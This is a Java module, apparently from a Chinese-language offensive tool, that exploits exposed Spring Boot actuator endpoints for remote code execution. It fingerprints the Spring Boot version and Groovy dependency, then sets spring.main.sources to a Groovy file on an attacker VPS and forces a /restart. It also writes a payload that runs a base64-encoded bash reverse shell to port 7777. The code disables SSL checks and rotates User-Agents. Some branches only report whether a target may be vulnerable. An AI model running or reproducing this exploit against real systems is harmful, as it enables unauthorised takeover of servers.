package src.main.module;

import src.main.common.UA_Config;
import src.main.impl.ResultCallback;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class MainSourceGroovyRCE {
    private String address;
    private String vpsIP;
    private String vpsPORT;
    private boolean isPoc;
    public String text;
    public String expdata1 = "spring.main.sources=http://%s/MainSourceGR.groovy";
    public String expdata2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://%s/MainSourceGR.groovy\"}";
    public String cmdtmp = "bash -i >&/dev/tcp/%s/7777 0>&1";
    public String payload = "Runtime.getRuntime().exec(\"bash -c {echo,%s}|{base64,-d}|{bash,-i}\");";


    public MainSourceGroovyRCE(String address, String vpsIP, String vpsPORT, boolean isPoc){
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPORT = vpsPORT;
        this.isPoc = isPoc;
    }

    public void Result1(ResultCallback callback){
        String llib = "groovy";
        String api = "/env";
        String resapi = "/restart";
        String site = address + api;
        String resite = address + resapi;
        String ua = "";
        String data = "";
        disableSSLVerification();
        data = String.format(expdata1, vpsIP + ":" + vpsPORT);
        try {
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            conn.setDoOutput(true);
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib))) {
                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                if (matcher.find()) {
                    text = String.format("groovy 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    try {
                        URL obj1 = new URL(site);
                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                        ua = uacf.getRandomUserAgent(ualist);
                        conn1.setRequestProperty("User-Agent", ua);
                        conn1.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                        conn1.setRequestMethod("POST");
                        conn1.setDoOutput(true);
                        try (OutputStream os = conn1.getOutputStream()) {
                            byte[] input = data.getBytes(StandardCharsets.UTF_8);
                            os.write(input, 0, input.length);
                        }
                        int responseCode1 = conn1.getResponseCode();
                        if (responseCode1 == HttpURLConnection.HTTP_OK) {
                            try {
                                URL obj2 = new URL(resite);
                                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                                ua = uacf.getRandomUserAgent(ualist);
                                conn2.setRequestProperty("User-Agent", ua);
                                conn2.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                                conn2.setRequestMethod("POST");
                                conn2.setDoOutput(true);
                                int responseCode2 = conn2.getResponseCode();
                                if (responseCode2 == HttpURLConnection.HTTP_OK) {
                                    text = "执行命令成功";
                                    callback.onResult(text);
                                } else {
                                    text = "错误：发送restart请求失败，状态码为: " + responseCode2;
                                    callback.onResult(text);
                                }
                            } catch (Exception e) {
                                text = "异常：发起restart请求失败";
                                callback.onResult(text);
                                e.printStackTrace();
                            }
                        }
                    } catch (Exception e) {
                        text = "发起env请求失败";
                        callback.onResult(text);
                        e.printStackTrace();
                    }
                }else {
                    text = "未找到依赖项！";
                    callback.onResult(text);
                }
            }
        }catch (Exception e) {
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result2(ResultCallback callback){
        String llib = "groovy";
        String api = "/actuator/env";
        String resapi = "/actuator/restart";
        String site = address + api;
        String resite = address + resapi;
        String ua = "";
        String data = "";
        disableSSLVerification();
        data = String.format(expdata2, vpsIP + ":" + vpsPORT);
        try {
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            conn.setDoOutput(true);
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib))) {
                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                if (matcher.find()) {
                    text = String.format("groovy 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    try {
                        URL obj1 = new URL(site);
                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                        ua = uacf.getRandomUserAgent(ualist);
                        conn1.setRequestProperty("User-Agent", ua);
                        conn1.setRequestProperty("Content-Type", "application/json");
                        conn1.setRequestMethod("POST");
                        conn1.setDoOutput(true);
                        String b64payload = Base64.getEncoder().encodeToString(String.format(cmdtmp,vpsIP).getBytes());
                        String exp = String.format(payload,b64payload);
                        try {
                            FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/resources/MainSourceGR.groovy");
                            Scanner sc = new Scanner(System.in);
                            writer.write(exp);
                            sc.close();
                            writer.close();
                            text = "MainSourceGR.groovy文件写入成功";
                            callback.onResult(text);
                        }catch (IOException e){
                            text = "MainSourceGR.groovy文件写入失败";
                            callback.onResult(text);
                            e.printStackTrace();
                        }
                        try (OutputStream os = conn1.getOutputStream()) {
                            byte[] input = data.getBytes(StandardCharsets.UTF_8);
                            os.write(input, 0, input.length);
                        }
                        int responseCode1 = conn1.getResponseCode();
                        if (responseCode1 == HttpURLConnection.HTTP_OK) {
                            try {
                                URL obj2 = new URL(resite);
                                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                                ua = uacf.getRandomUserAgent(ualist);
                                conn2.setRequestProperty("User-Agent", ua);
                                conn2.setRequestProperty("Content-Type", "application/json");
                                conn2.setRequestMethod("POST");
                                conn2.setDoOutput(true);
                                int responseCode2 = conn2.getResponseCode();
                                if (responseCode2 == HttpURLConnection.HTTP_OK) {
                                    text = "执行命令成功";
                                    callback.onResult(text);
                                    text = "当前反弹vpsIP: " + vpsIP + "vpsPort: 7777";
                                    callback.onResult(text);
                                } else {
                                    text = "错误：发送restart请求失败，状态码为: " + responseCode2;
                                    callback.onResult(text);
                                }
                            } catch (Exception e) {
                                text = "异常：发起restart请求失败";
                                callback.onResult(text);
                                e.printStackTrace();
                            }
                        }
                    } catch (Exception e) {
                        text = "发起env请求失败";
                        callback.onResult(text);
                        e.printStackTrace();
                    }
                }else {
                    text = "未找到依赖项！";
                    callback.onResult(text);
                }
            }
        }catch (Exception e) {
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result3(ResultCallback callback){
        String llib = "groovy";
        String api = "/env";
        String site = address + api;
        String ua = "";
        disableSSLVerification();
        try {
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent", ua);
            conn.setRequestMethod("GET");
            conn.setDoOutput(true);
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib))) {
                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                if (matcher.find()) {
                    text = String.format("groovy 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    URL obj1 = new URL(address + "/actuator");
                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                    conn1.setDoOutput(true);
                    conn1.setRequestProperty("User-Agent", ua);
                    conn1.setRequestMethod("GET");
                    int responseCode1 = conn1.getResponseCode();
                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                    String inputLine1;
                    StringBuilder response1 = new StringBuilder();
                    while ((inputLine1 = in1.readLine()) != null) {
                        response1.append(inputLine1);
                    }
                    in1.close();
                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains("/restart")) && !matcher.group(1).isEmpty()) {
                        text = "可能存在漏洞";
                        callback.onResult(text);
                    }else {
                        text = "不存在可利用漏洞";
                        callback.onResult(text);
                    }
                }
            }
        }catch (Exception e){
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result4(ResultCallback callback){
            String llib = "groovy";
            String api = "/actuator/env";
            String site = address + api;
            String ua = "";
            disableSSLVerification();
            try {
                UA_Config uacf = new UA_Config();
                List<String> ualist = uacf.loadUserAgents();
                URL obj = new URL(site);
                HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
                ua = uacf.getRandomUserAgent(ualist);
                conn.setRequestProperty("User-Agent", ua);
                conn.setRequestMethod("GET");
                conn.setDoOutput(true);
                int responseCode = conn.getResponseCode();
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();
                if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib))) {
                    String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                    Pattern pattern = Pattern.compile(regex);
                    Matcher matcher = pattern.matcher(response.toString());
                    if (matcher.find()) {
                        text = String.format("groovy 依赖为: %s", matcher.group(1));
                        callback.onResult(text);
                        URL obj1 = new URL(address + "/actuator");
                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                        conn1.setDoOutput(true);
                        conn1.setRequestProperty("User-Agent", ua);
                        conn1.setRequestMethod("GET");
                        int responseCode1 = conn1.getResponseCode();
                        BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                        String inputLine1;
                        StringBuilder response1 = new StringBuilder();
                        while ((inputLine1 = in1.readLine()) != null) {
                            response1.append(inputLine1);
                        }
                        in1.close();
                        if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains("/restart")) && !matcher.group(1).isEmpty()) {
                            text = "可能存在漏洞";
                            callback.onResult(text);
                        }else {
                            text = "不存在可利用漏洞";
                            callback.onResult(text);
                        }
                    }
                }
            }catch (Exception e){
                text = "检测依赖异常";
                callback.onResult(text);
                e.printStackTrace();
            }
    }
    public void Exp(ResultCallback callback){
        String api = "/actuator/env";
        String site = address + api;
        String ua = "";
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                text = "当前版本为springboot2";
                callback.onResult(text);
                if (isPoc && vpsIP.isEmpty() && vpsPORT.isEmpty()){
                    Result4(callback);
                }else {
                    Result2(callback);
                }
            }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                text = "当前版本为springboot1";
                callback.onResult("当前版本为springboot1");
                if (isPoc && vpsIP.isEmpty() && vpsPORT.isEmpty()){
                    Result3(callback);
                }else {
                    Result1(callback);
                }
            }else{
                text = "未识别springboot版本";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "检测springboot版本异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }

}
